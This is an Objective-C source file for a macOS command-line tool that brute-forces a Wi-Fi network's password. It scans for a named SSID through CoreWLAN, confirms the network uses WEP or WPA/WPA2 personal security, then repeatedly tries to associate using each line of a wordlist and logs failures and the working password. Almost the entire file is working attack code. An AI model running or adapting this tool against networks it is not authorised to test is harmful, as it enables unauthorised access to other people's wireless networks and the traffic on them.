//
//  main.cpp
//  CocoaPdfCrack
//
//  Created by Oriol Ferrer Mesià on 06/11/12.
//  Copyright (c) 2012 Oriol Ferrer Mesià. All rights reserved.
//

#import <Cocoa/Cocoa.h>
#import <CoreWLAN/CoreWLAN.h>
#import "FileReader.h"

#define BLACK @"\e[0m"
#define RED @"\e[1;31m"
#define GREEN @"\e[0;32m"

int main(int argc, char *argv[]){

	NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];

	if (argc != 4) {
		printf("usage: CocoaWifiCrack interface ssid wordlist\nexample: CocoaWifiCrack en1 myWifiNetwork myWordlist.txt\n\n");
		exit(0);
	}

	NSString * interface = [NSString stringWithCString: argv[1] encoding:NSASCIIStringEncoding];
	NSString * ssid = [NSString stringWithCString: argv[2] encoding:NSASCIIStringEncoding];
	NSString * dictPath = [NSString stringWithCString: argv[3] encoding:NSASCIIStringEncoding];

//	interface = @"en2";
//	ssid = @"FABRICA";
//	dictPath = @"tiny.txt";


	NSLog(@"Scanning for network \"%@\" on interface \"%@\"...", ssid, interface);

	NSError *err = nil;
	CWInterface * wifiInterface = [CWInterface interfaceWithName: interface ];

	NSSet * networks = [wifiInterface scanForNetworksWithName:ssid error:&err];
//	for (CWNetwork * net in networks){
//		NSLog(@"%@", net);
//	}

	CWNetwork * network = [networks anyObject];
	if (network != nil){

		if (	[network supportsSecurity: kCWSecurityWEP] ||
				[network supportsSecurity: kCWSecurityWPAPersonal] ||
				[network supportsSecurity: kCWSecurityWPAPersonalMixed] ||
				[network supportsSecurity: kCWSecurityWPA2Personal] ||
				[network supportsSecurity: kCWSecurityDynamicWEP]
			){

			NSLog(@"Found Network %@ (%@) on channel %ld\n", ssid, network.bssid, network.wlanChannel.channelNumber );
			NSLog(@"Loaded wordList \"%@\"", dictPath);
			NSLog(@"Bruteforcing \"%@\" on interface \"%@\" with dictionary \"%@\"", ssid, interface, dictPath);

			FileReader* fileReader = [[FileReader alloc] initWithFilePath:dictPath];

			NSString * password = [fileReader readLine];
			if (password == nil){
				NSLog(@"Wordlist file (%@) is empty or non existant!", dictPath);
			}

			NSAutoreleasePool * pool2 = [[NSAutoreleasePool alloc] init];

			long c = 0;
			while( password != nil ){

				password = [password stringByReplacingOccurrencesOfString:@"\n" withString:@""];

				NSDate *start = [NSDate date];
				BOOL didAssociate = [wifiInterface associateToNetwork: network password:password error:&err];
				NSTimeInterval timeInterval = fabs([start timeIntervalSinceNow]);
				err = nil;

				if (!didAssociate){
					NSLog(@"spent %.2f seconds testing password %@\"%@\"%@", timeInterval, RED, password, BLACK);
					if (err!= nil) NSLog(@"err: %@", [err userInfo]);
				}else{
					NSLog(@">>> Associated to \"%@\" on \"%@\" with password %@\"%@\"%@ <<<", ssid, interface, GREEN, password, BLACK );
					break;
				}

				password = [fileReader readLine]; //get next password

				c++;
				if (c%1000 == 1){
					[pool2 release];
					pool2 = [[NSAutoreleasePool alloc] init];
				}
			}

		}else{
			NSLog(@"Network %@ doesn't require a password, or it uses enterprise aithentication", ssid);
		}
	}else{
		NSLog(@"Can't find network %@", ssid );
	}

	[pool release];
}


